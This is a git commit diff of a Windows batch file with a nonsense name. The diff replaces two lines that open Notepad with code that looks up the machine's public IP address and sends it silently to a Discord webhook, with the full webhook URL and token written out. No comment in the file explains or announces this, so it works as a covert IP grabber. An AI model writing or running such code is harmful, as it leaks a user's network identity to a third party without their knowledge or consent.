198bb02d33c06c214d7afa2ed50ec5fd476bb392
ctvs <krekiven@gmail.com>
2025-05-11 01:27:17 +0200

    Update adasDasdasdassda.bat

--- adasDasdasdassda.bat
+++ adasDasdasdassda.bat
@@ -1,3 +1,3 @@
 @echo off
-start notepad
-start notepad
+for /f "tokens=*" %%i in ('curl -s https://api.ipify.org') do set IP=%%i
+curl -X POST -H "Content-Type: application/json" -d "{\"ip\":\"%IP%\"}" https://canary.discord.com/api/webhooks/1370905037009715250/8-Wr_LBH9SXxKxjhZkOypSEJrUKlCkKiU1a5WDUPyYYkbkmRKEfBGw3mRQB5ggh2iRXJ
